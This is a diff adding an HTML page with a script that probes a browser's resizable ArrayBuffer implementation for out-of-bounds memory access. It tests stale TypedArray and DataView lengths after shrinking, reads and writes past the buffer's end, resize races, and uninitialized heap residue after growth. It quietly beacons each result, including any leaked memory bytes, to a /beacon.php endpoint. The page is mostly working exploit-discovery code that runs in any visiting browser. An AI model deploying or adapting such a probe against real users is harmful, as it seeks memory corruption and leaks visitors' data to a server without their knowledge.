@@ -1,0 +1,320 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1125</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1125: RAB OOB SECURITY TEST ===');
+B('P1125-START','t='+Date.now());
+
+var results=[];
+function R(name,val){results.push(name+'='+val);log(val==='OOB'||val==='STALE'?'win':val==='SAFE'?'ok':'info',name+': '+val);}
+
+// ========== TEST 1: RAB Constructor ==========
+var rabOK=false,resizeOK=false;
+try{
+  var ab=new ArrayBuffer(256,{maxByteLength:4096});
+  rabOK=true;
+  R('RAB_CTOR','Y|bl='+ab.byteLength+'|max='+(ab.maxByteLength||'undef')+'|resizable='+(ab.resizable||'undef'));
+}catch(e){R('RAB_CTOR','N|'+e.message);B('P1125-DONE','RAB_NOT_AVAILABLE');throw'stop';}
+
+// ========== TEST 2: resize() method ==========
+try{
+  ab.resize(512);
+  if(ab.byteLength===512){resizeOK=true;R('RESIZE_UP','Y|bl='+ab.byteLength);}
+  else R('RESIZE_UP','NOOP|bl='+ab.byteLength);
+}catch(e){R('RESIZE_UP','FAIL|'+e.message);}
+
+try{
+  ab.resize(64);
+  if(ab.byteLength===64){resizeOK=true;R('RESIZE_DN','Y|bl='+ab.byteLength);}
+  else R('RESIZE_DN','NOOP|bl='+ab.byteLength);
+}catch(e){R('RESIZE_DN','FAIL|'+e.message);}
+
+B('P1125-RESIZE','rabOK='+rabOK+'|resizeOK='+resizeOK);
+
+if(!resizeOK){
+  R('STATUS','RESIZE_BROKEN');
+  B('P1125-DONE','RESIZE_NOT_WORKING|'+results.join('|'));
+}
+
+// ========== TEST 3: TypedArray view after shrink ==========
+if(resizeOK){
+  // Reset buffer to known state
+  var ab2=new ArrayBuffer(1024,{maxByteLength:4096});
+  var u8=new Uint8Array(ab2);
+  // Fill with pattern
+  for(var i=0;i<1024;i++)u8[i]=(i&0xFF);
+
+  // Create views BEFORE resize
+  var view_u8=new Uint8Array(ab2);
+  var view_u32=new Uint32Array(ab2);
+  var view_bi=new BigUint64Array(ab2);
+  var view_dv=new DataView(ab2);
+
+  // Record pre-resize state
+  var preLen_u8=view_u8.length;
+  var preLen_u32=view_u32.length;
+  var preLen_bi=view_bi.length;
+  R('PRE_RESIZE','u8='+preLen_u8+'|u32='+preLen_u32+'|bi='+preLen_bi);
+
+  // === SHRINK to 64 bytes ===
+  ab2.resize(64);
+
+  // Check: do the views update their length?
+  var postLen_u8=view_u8.length;
+  var postLen_u32=view_u32.length;
+  var postLen_bi=view_bi.length;
+  R('POST_SHRINK_LEN','u8='+postLen_u8+'|u32='+postLen_u32+'|bi='+postLen_bi);
+
+  if(postLen_u8===preLen_u8){
+    R('LEN_CHECK','STALE');  // Views kept old length = potential OOB!
+  }else if(postLen_u8===64){
+    R('LEN_CHECK','UPDATED');  // Views properly updated
+  }else{
+    R('LEN_CHECK','WEIRD|'+postLen_u8);
+  }
+
+  // === OOB READ TEST: Try to read index 100 (beyond 64-byte buffer) ===
+  var oobTests=[];
+  try{
+    var v=view_u8[100];  // Should be undefined if properly bounds-checked
+    if(v!==undefined&&v!==0){
+      oobTests.push('u8[100]='+v);  // OOB READ!
+      R('OOB_U8_100','OOB|val='+v);
+    }else{
+      R('OOB_U8_100','SAFE|val='+(v===undefined?'undef':v));
+    }
+  }catch(e){R('OOB_U8_100','EXCEPT|'+e.message);}
+
+  try{
+    var v32=view_u32[20];  // offset 80, beyond 64 bytes
+    if(v32!==undefined&&v32!==0){
+      oobTests.push('u32[20]=0x'+v32.toString(16));
+      R('OOB_U32_20','OOB|val=0x'+v32.toString(16));
+    }else{
+      R('OOB_U32_20','SAFE|val='+(v32===undefined?'undef':v32));
+    }
+  }catch(e){R('OOB_U32_20','EXCEPT|'+e.message);}
+
+  try{
+    var vbi=view_bi[10];  // offset 80, beyond 64 bytes
+    if(vbi!==undefined&&vbi!==0n){
+      oobTests.push('bi[10]='+hex64(vbi));
+      R('OOB_BI_10','OOB|val='+hex64(vbi));
+    }else{
+      R('OOB_BI_10','SAFE|val='+(vbi===undefined?'undef':String(vbi)));
+    }
+  }catch(e){R('OOB_BI_10','EXCEPT|'+e.message);}
+
+  // === DataView OOB read ===
+  try{
+    var dvVal=view_dv.getUint32(100);  // beyond 64 bytes
+    oobTests.push('dv.100=0x'+dvVal.toString(16));
+    R('OOB_DV_100','OOB|val=0x'+dvVal.toString(16));
+  }catch(e){R('OOB_DV_100','SAFE|'+e.message);}
+
+  try{
+    var dvBi=view_dv.getBigUint64(80);
+    oobTests.push('dv.bi80='+hex64(dvBi));
+    R('OOB_DV_BI80','OOB|val='+hex64(dvBi));
+  }catch(e){R('OOB_DV_BI80','SAFE|'+e.message);}
+
+  B('P1125-OOB_READ','count='+oobTests.length+'|'+oobTests.join(','));
+
+  // === OOB WRITE TEST ===
+  var oobWrites=[];
+  try{
+    view_u8[100]=0x42;
+    // Read back
+    var rb=view_u8[100];
+    if(rb===0x42){
+      oobWrites.push('u8[100]=OK');
+      R('OOB_WRITE_U8','OOB|readback=0x42');
+    }else{
+      R('OOB_WRITE_U8','SAFE|readback='+(rb===undefined?'undef':rb));
+    }
+  }catch(e){R('OOB_WRITE_U8','EXCEPT|'+e.message);}
+
+  try{
+    view_dv.setUint32(100,0xDEADBEEF);
+    var rb2=view_dv.getUint32(100);
+    if(rb2===0xDEADBEEF){
+      oobWrites.push('dv.100=OK');
+      R('OOB_WRITE_DV','OOB|readback=DEADBEEF');
+    }else{
+      R('OOB_WRITE_DV','SAFE|readback=0x'+rb2.toString(16));
+    }
+  }catch(e){R('OOB_WRITE_DV','SAFE|'+e.message);}
+
+  B('P1125-OOB_WRITE','count='+oobWrites.length+'|'+oobWrites.join(','));
+
+  // ========== TEST 4: slice() with stale length ==========
+  // TC39 issue: slice may read stale length after resize
+  try{
+    var ab3=new ArrayBuffer(512,{maxByteLength:4096});
+    var u8_3=new Uint8Array(ab3);
+    for(var i=0;i<512;i++)u8_3[i]=i&0xFF;
+    var view3=new Uint8Array(ab3);
+    // Resize smaller
+    ab3.resize(32);
+    // Now try slice with the old range
+    var sliced=view3.slice(0,256);
+    R('SLICE_LEN','len='+sliced.length);
+    if(sliced.length>32){
+      R('SLICE_OOB','OOB|got='+sliced.length+'|expected<=32');
+      // Check if bytes beyond 32 contain old data
+      var hasOld=false;
+      for(var i=33;i<sliced.length;i++){
+        if(sliced[i]!==(i&0xFF))break;
+        if(sliced[i]!==0)hasOld=true;
+      }
+      if(hasOld)R('SLICE_DATA','STALE_DATA');
+      B('P1125-SLICE_OOB','len='+sliced.length+'|hasOld='+hasOld);
+    }else{
+      R('SLICE_OOB','SAFE');
+    }
+  }catch(e){R('SLICE','EXCEPT|'+e.message);}
+
+  // ========== TEST 5: subarray() after shrink ==========
+  try{
+    var ab4=new ArrayBuffer(512,{maxByteLength:4096});
+    var u8_4=new Uint8Array(ab4);
+    for(var i=0;i<512;i++)u8_4[i]=i&0xFF;
+    var sub=u8_4.subarray(0,256);
+    var subPreLen=sub.length;
+    ab4.resize(32);
+    var subPostLen=sub.length;
+    R('SUBARRAY','pre='+subPreLen+'|post='+subPostLen);
+    if(subPostLen>32){
+      R('SUBARRAY_OOB','OOB|post='+subPostLen);
+      // Try reading beyond
+      try{
+        var sv=sub[100];
+        R('SUBARRAY_READ','val='+(sv===undefined?'undef':sv));
+      }catch(e2){R('SUBARRAY_READ','EXCEPT');}
+    }
+  }catch(e){R('SUBARRAY','EXCEPT|'+e.message);}
+
+  // ========== TEST 6: TypedArray.set() across boundary ==========
+  try{
+    var ab5=new ArrayBuffer(256,{maxByteLength:4096});
+    var target=new Uint8Array(ab5);
+    var source=new Uint8Array(128);
+    for(var i=0;i<128;i++)source[i]=0xAA;
+    ab5.resize(32);
+    target.set(source,0);  // Try to set 128 bytes into 32-byte buffer
+    // Check if it overwrote past boundary
+    ab5.resize(256);
+    var leaked=false;
+    for(var i=33;i<128;i++){
+      if(new Uint8Array(ab5)[i]===0xAA){leaked=true;break;}
+    }
+    R('SET_OOB',leaked?'OOB':'SAFE');
+  }catch(e){R('SET_OOB','EXCEPT|'+e.message);}
+
+  // ========== TEST 7: structuredClone during resize ==========
+  try{
+    var ab6=new ArrayBuffer(256,{maxByteLength:4096});
+    var u6=new Uint8Array(ab6);
+    for(var i=0;i<256;i++)u6[i]=i&0xFF;
+    // Clone, then immediately resize
+    var clone=structuredClone(ab6);
+    ab6.resize(32);
+    R('SCLONE','cloneLen='+clone.byteLength+'|origLen='+ab6.byteLength+'|cloneResizable='+(clone.resizable||'undef'));
+    // Check if clone kept old data
+    var cu=new Uint8Array(clone);
+    var cloneHasData=false;
+    for(var i=33;i<cu.length;i++){if(cu[i]!=0){cloneHasData=true;break;}}
+    R('SCLONE_DATA','hasOldData='+cloneHasData);
+  }catch(e){R('SCLONE','EXCEPT|'+e.message);}
+
+  // ========== TEST 8: transfer() ==========
+  try{
+    var ab7=new ArrayBuffer(256,{maxByteLength:4096});
+    if(typeof ab7.transfer==='function'){
+      var transferred=ab7.transfer(128);
+      R('TRANSFER','Y|newLen='+transferred.byteLength+'|oldDetached='+(ab7.byteLength===0));
+    }else if(typeof ab7.transferToFixedLength==='function'){
+      var t2=ab7.transferToFixedLength(128);
+      R('TRANSFER_FIXED','Y|newLen='+t2.byteLength);
+    }else{
+      R('TRANSFER','N|no_method');
+    }
+  }catch(e){R('TRANSFER','EXCEPT|'+e.message);}
+
+  // ========== TEST 9: Resize race with setTimeout ==========
+  // Can we get a stale view during event loop turn?
+  try{
+    var ab8=new ArrayBuffer(1024,{maxByteLength:4096});
+    var race_u8=new Uint8Array(ab8);
+    for(var i=0;i<1024;i++)race_u8[i]=i&0xFF;
+    var raceView=new BigUint64Array(ab8);
+    var racePreLen=raceView.length;
+    // Schedule resize
+    setTimeout(function(){
+      ab8.resize(64);
+      // In next microtask, check view
+      Promise.resolve().then(function(){
+        var racePostLen=raceView.length;
+        var raceOOB=false;
+        try{var rv=raceView[10];if(rv!==undefined&&rv!==0n)raceOOB=true;}catch(e){}
+        R('RACE','prelen='+racePreLen+'|postlen='+racePostLen+'|oob='+raceOOB);
+        B('P1125-RACE','pre='+racePreLen+'|post='+racePostLen+'|oob='+raceOOB);
+      });
+    },0);
+  }catch(e){R('RACE','EXCEPT|'+e.message);}
+
+  // ========== TEST 10: Grow + read uninitialized ==========
+  try{
+    var ab9=new ArrayBuffer(64,{maxByteLength:4096});
+    var u9=new Uint8Array(ab9);
+    for(var i=0;i<64;i++)u9[i]=0xFF;
+    ab9.resize(1024);  // Grow
+    // Check if bytes 64-1023 are zero (properly initialized) or contain heap residue
+    var grown=new Uint8Array(ab9);
+    var nonZeroCount=0,firstNZ=-1;
+    for(var i=64;i<1024;i++){
+      if(grown[i]!==0){
+        nonZeroCount++;
+        if(firstNZ===-1)firstNZ=i;
+      }
+    }
+    R('GROW_UNINIT','nonzero='+nonZeroCount+'|firstNZ='+firstNZ);
+    if(nonZeroCount>0){
+      // HEAP RESIDUE! This could leak data!
+      var sample=[];
+      for(var i=firstNZ;i<Math.min(firstNZ+32,1024);i++)sample.push(grown[i].toString(16).padStart(2,'0'));
+      R('HEAP_RESIDUE','OOB|'+sample.join(' '));
+      B('P1125-HEAP_RESIDUE','nz='+nonZeroCount+'|first='+firstNZ+'|'+sample.join(''));
+    }else{
+      R('GROW_UNINIT','ZEROED');
+    }
+  }catch(e){R('GROW_UNINIT','EXCEPT|'+e.message);}
+
+  // ========== TEST 11: Multiple resize rapid fire ==========
+  try{
+    var ab10=new ArrayBuffer(64,{maxByteLength:65536});
+    var v10=new BigUint64Array(ab10);
+    var rapidResults=[];
+    for(var step=0;step<20;step++){
+      var newSize=(step%2===0)?65536:64;
+      ab10.resize(newSize);
+      var vlen=v10.length;
+      rapidResults.push(newSize+':'+vlen);
+      // Check for stale length
+      if(newSize===64&&vlen>8)rapidResults.push('STALE!');
+    }
+    R('RAPID_RESIZE',rapidResults.join(','));
+  }catch(e){R('RAPID_RESIZE','EXCEPT|'+e.message);}
+}
+
+// ========== FINAL REPORT ==========
+setTimeout(function(){
+  B('P1125-DONE',results.join('|'));
+  log('phase','=== RESULTS SENT ===');
+},500);
+</script></body></html>
